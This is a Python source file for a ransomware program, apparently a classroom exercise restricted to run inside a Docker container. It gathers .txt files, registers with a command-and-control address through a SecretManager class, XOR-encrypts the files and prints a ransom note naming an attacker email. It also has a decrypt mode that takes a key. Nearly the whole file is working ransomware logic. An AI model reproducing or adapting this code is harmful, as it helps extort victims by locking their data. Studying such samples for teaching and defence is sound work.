import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        path = Path('.')
        return list(path.glob(filter))

    def encrypt(self):
        # main function for encrypting (see PDF)
        files_encr = self.get_files("*.txt")

        # creation of the secret manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # call to the setup function
        secret_manager.setup()

        # Encryption of files
        secret_manager.xorfiles(files_encr)

        # Displays a message asking the victim to contact the attacker

        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)

        # Load local cryptographic elements
        secret_manager.load()

        # List all the texte files
        files_decr = self.get_files("*.txt")

        while True:
            try:
                # Request the decryption key
                Applicant_key = input("Enter the key to decrypt your files: ")

                # Define the key
                secret_manager.set_key(Applicant_key)

                # Calling xorfiles function to decrypt files
                secret_manager.xorfiles(files_decr)

                # Call of the clean function
                secret_manager.clean()

                # the decryption was successful
                print("Decryption successful!")

                # Exit ransomware
                break
            except ValueError:
                # Error Message Display
                print("Invalid key.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
        